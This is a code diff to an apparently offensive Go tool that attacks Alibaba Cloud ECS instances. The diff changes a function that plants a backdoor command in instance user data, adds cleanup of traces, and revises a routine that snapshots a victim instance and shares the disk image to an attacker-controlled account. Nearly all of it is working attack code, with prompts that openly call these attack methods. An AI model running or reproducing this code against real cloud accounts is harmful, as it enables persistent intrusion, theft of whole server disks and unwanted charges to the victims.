@@ -98,7 +98,7 @@ func DescribeInvocationResults(region string, CommandId string, InvokeId string,
 	return output
 }
 
-func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string, imageHijack string) {
+func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string, imageShare string) {
 	var InstancesList []Instances
 	if ecsFlushCache == false {
 		data := cmdutil.ReadECSCache("alibaba")
@@ -198,15 +198,15 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 		for _, i := range InstancesList {
 			specifiedInstanceID := i.InstanceId
 			if userDataBackdoor != "" {
-				UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType)
-			} else if imageHijack !="" {
+				UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType, i.Status)
+			} else if imageShare !="" {
 				var isSure string
 				prompt := &survey.Input{
 			        Message: "警告：使用该攻击手法，会在目标账户上新建一个快照和镜像，本程序在攻击成功后提供删除功能。\n但如果因为意外情况导致快照或镜像残留在目标，有可能导致目标阿里云账户造成不必要支出。\n如果你已明确并确认要使用此攻击手法，请键入Yes，键入其他单词将退出此功能 \n(Warning: Using this attack method, a snapshot and mirror will be created on the target account. This program provides deletion function after successful attack. However, if the snapshot or mirror remains on the target due to unexpected circumstances, unnecessary expenses may be caused to the target Ali Cloud account. If you have specified and confirmed that you want to use this attack, type Yes.Any other words will exit this feature)",
 			    }
 			    survey.AskOne(prompt, &isSure)
 			    if isSure == "Yes" {
-			    	ImageHijack(i.RegionId, imageHijack, specifiedInstanceID, timeOut)
+			    	ImageShare(i.RegionId, imageShare, specifiedInstanceID, timeOut)
 			    }
 			}else if i.Status == "Running" {
 				num = num + 1
@@ -361,7 +361,24 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 	return commandResult
 }
 
-func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string) {
+func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string, ecsStatus string) {
+	if ecsStatus == "Running" {
+		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+		if commandResult == "disabled" {
+			fmt.Println("元数据拒绝访问 (Metadata access is denied)")
+			return
+		}
+		if commandResult != "" {
+			var isSure string
+			prompt := &survey.Input{
+		        Message: "警告：检测到目标机器原本已有元数据，是否进行覆盖写入，此操作可能会导致业务上造成损失。如果你确定要使用此攻击手法，请键入Yes (Warning: Metadata has been detected on the target machine. Determine whether to write metadata to the target machine. This operation may cause service loss. If you are sure you want to use this attack, type Yes)",
+		    }
+		    survey.AskOne(prompt, &isSure)
+		    if isSure != "Yes" {
+		    	return
+		    }
+		}
+	}
 	request := ecs.CreateModifyInstanceAttributeRequest()
 	request.Scheme = "https"
 	request.InstanceId = specifiedInstanceID
@@ -374,16 +391,57 @@ func UserDataBackdoor(region string, command string, specifiedInstanceID string,
 	errutil.HandleErr(err)
 	commandResult := response.GetHttpStatus()
 	if commandResult == 200 {
-		fmt.Println("执行成功，正在查询userdata值 (The execution is successful, and the userdata value is being queried)")
-		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut )
-		fmt.Println(commandResult)
+		if ecsStatus == "Running" {
+			fmt.Println("执行成功，正在查询userdata值 (The execution is successful, and the userdata value is being queried)")
+			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+			fmt.Println(commandResult2)
+		} else {
+			fmt.Println("执行成功 (The execution is successful)")
+		}
 		fmt.Println("如需使后门立即生效，请重启目标服务器 (For the backdoor to take effect immediately, please restart the target instance)")
 	} else {
 		fmt.Println("写入失败，请确认是否有 ModifyInstanceAttribute 权限 (Failed to write, please confirm whether you have the ModifyInstanceAttribute permission)")
 	}
 }
 
-func ImageHijack(region string, aliyunAccount string, specifiedInstanceID string, timeOut int) {
+func ImageDelete(region string,aliyunAccount string, imageId string, specifiedInstanceID string) {
+	modifyImageSharePermissionRequest := ecs.CreateModifyImageSharePermissionRequest()
+	modifyImageSharePermissionRequest.Scheme = "https"
+	modifyImageSharePermissionRequest.ImageId = imageId
+
+	modifyImageSharePermissionRequest.QueryParams["RemoveAccount.1"] = aliyunAccount
+	ECSClient(region).ModifyImageSharePermission(modifyImageSharePermissionRequest)
+
+	deleteImageRequest := ecs.CreateDeleteImageRequest()
+	deleteImageRequest.ImageId = imageId
+	deleteImageRequest.QueryParams["Force"] = "true"	
+	_, err := ECSClient(region).DeleteImage(deleteImageRequest)
+	errutil.HandleErr(err)
+
+	describeSnapshotsRequest := ecs.CreateDescribeSnapshotsRequest()
+	describeSnapshotsRequest.InstanceId = specifiedInstanceID
+	describeSnapshotsRequest.SnapshotType = "user"
+	describeSnapshotsRequest.QueryParams["output"] = "cols=SnapshotName,SnapshotId,LastModifiedTime rows=Snapshots.Snapshot[]"
+	describeSnapshotsResponse, err := ECSClient(region).DescribeSnapshots(describeSnapshotsRequest)
+	errutil.HandleErr(err)
+
+	var lastModifiedTime time.Time
+	var snapShotId string
+	for _, snapshot := range describeSnapshotsResponse.Snapshots.Snapshot {
+        snapshotTime, _ := time.Parse(time.RFC3339, snapshot.LastModifiedTime)
+        if snapshotTime.After(lastModifiedTime) {
+            lastModifiedTime = snapshotTime
+            snapShotId = snapshot.SnapshotId
+        }
+    }
+
+	deleteSnapshotRequest := ecs.CreateDeleteSnapshotRequest()
+	deleteSnapshotRequest.SnapshotId = snapShotId
+	ECSClient(region).DeleteSnapshot(deleteSnapshotRequest)
+	fmt.Println("清理完成 (Clean up completed)")
+}
+
+func ImageShare(region string, aliyunAccount string, specifiedInstanceID string, timeOut int) {
 	createImageRequest := ecs.CreateCreateImageRequest()
 	createImageRequest.Scheme = "https"
 	createImageRequest.InstanceId = specifiedInstanceID
@@ -402,16 +460,16 @@ func ImageHijack(region string, aliyunAccount string, specifiedInstanceID string
 	describeImagesRequest.QueryParams["waiter"] = "expr='Images.Image[0].Status' to=Available"
 	describeImagesRequest.QueryParams["output"] = "cols=ImageId,Tags.Tag[0].TagValue,Status rows=Images.Image[]"
 
-	fmt.Println("正在创建目标实例镜像，请耐心等待 (The target instance image is being created. Please wait...)")
+	fmt.Println("正在创建目标实例镜像，请耐心等待，不要狂按回车 (Creating target instance image, please be patient and do not press Enter frequently)")
 	for {
 		describeImagesResponse, _ := ECSClient(region).DescribeImages(describeImagesRequest)
 
 		if len(describeImagesResponse.Images.Image) > 0 && string(describeImagesResponse.Images.Image[0].Tags.Tag[0].TagValue) == "hack" {
-			fmt.Println("创建完成,正在劫持此镜像到指定阿里云账户中 (Creating complete, hijacking this image to the specified Aliyun account)")
+			fmt.Println("创建完成,正在共享此镜像到指定阿里云账户中 (Creating complete, hijacking this image to the specified Aliyun account)")
 			break
 		}
 
-		time.Sleep(10 * time.Second)
+		time.Sleep(5 * time.Second)
 	}
 
 
@@ -421,49 +479,21 @@ func ImageHijack(region string, aliyunAccount string, specifiedInstanceID string
 	modifyImageSharePermissionRequest.QueryParams["AddAccount.1"] = aliyunAccount
 	_, err = ECSClient(region).ModifyImageSharePermission(modifyImageSharePermissionRequest)
 	if err != nil {
-		fmt.Println("劫持失败，请确认是否有 ModifyImageSharePermission 权限 (Hijack failed, please confirm whether there are ModifyImageSharePermission permissions)")
+		fmt.Println("共享失败，请确认是否有 ModifyImageSharePermission 权限 (Share failed, please confirm whether there are ModifyImageSharePermission permissions)")
+		ImageDelete(region, aliyunAccount, imageId, specifiedInstanceID)
 		return
 	}
 
-	fmt.Println("劫持成功，请查看对应阿里云帐号的共享镜像")
+	fmt.Println("共享成功，请查看对应阿里云帐号的共享镜像 (Share success, check the shared image of the Ariyun account)")
 
-	cleanImage := []string{"Yes", "No"}
+	cleanImage := []string{"Yes"}
 	var cleanImageChoose string
     prompt := &survey.Select{
-        Message: "是否进行清理痕迹？注意，清理后共享镜像将会被立刻删除 (Are traces cleaned? Note that the shared image will be deleted immediately after clearing)",
+        Message: "删除共享镜像？注意，共享镜像后，被攻击对象已开始扣费，请复制共享镜像后，按回车删除共享镜像。若暂未复制镜像，请勿按回车 (Delete the shared mirror? Notice After the image is shared, the target starts to deduct fees. After copying the shared image, press Enter to delete the shared image. If the image is not copied, do not press Enter)",
         Options: cleanImage,
     }
     survey.AskOne(prompt, &cleanImageChoose)
     if cleanImageChoose == "Yes" {
-    	modifyImageSharePermissionRequest.QueryParams["RemoveAccount.1"] = aliyunAccount
-    	ECSClient(region).ModifyImageSharePermission(modifyImageSharePermissionRequest)
-
-    	deleteImageRequest := ecs.CreateDeleteImageRequest()
-		deleteImageRequest.ImageId = imageId
-		deleteImageRequest.QueryParams["Force"] = "true"	
-		_, err = ECSClient(region).DeleteImage(deleteImageRequest)
-		errutil.HandleErr(err)
-
-		describeSnapshotsRequest := ecs.CreateDescribeSnapshotsRequest()
-		describeSnapshotsRequest.InstanceId = specifiedInstanceID
-		describeSnapshotsRequest.SnapshotType = "user"
-		describeSnapshotsRequest.QueryParams["output"] = "cols=SnapshotName,SnapshotId,LastModifiedTime rows=Snapshots.Snapshot[]"
-		describeSnapshotsResponse, err := ECSClient(region).DescribeSnapshots(describeSnapshotsRequest)
-		errutil.HandleErr(err)
-
-		var lastModifiedTime time.Time
-		var snapShotId string
-		for _, snapshot := range describeSnapshotsResponse.Snapshots.Snapshot {
-	        snapshotTime, _ := time.Parse(time.RFC3339, snapshot.LastModifiedTime)
-	        if snapshotTime.After(lastModifiedTime) {
-	            lastModifiedTime = snapshotTime
-	            snapShotId = snapshot.SnapshotId
-	        }
-	    }
-
-		deleteSnapshotRequest := ecs.CreateDeleteSnapshotRequest()
-		deleteSnapshotRequest.SnapshotId = snapShotId
-		ECSClient(region).DeleteSnapshot(deleteSnapshotRequest)
-		fmt.Println("清理完成")
+    	ImageDelete(region, aliyunAccount, imageId, specifiedInstanceID)
     }
 }
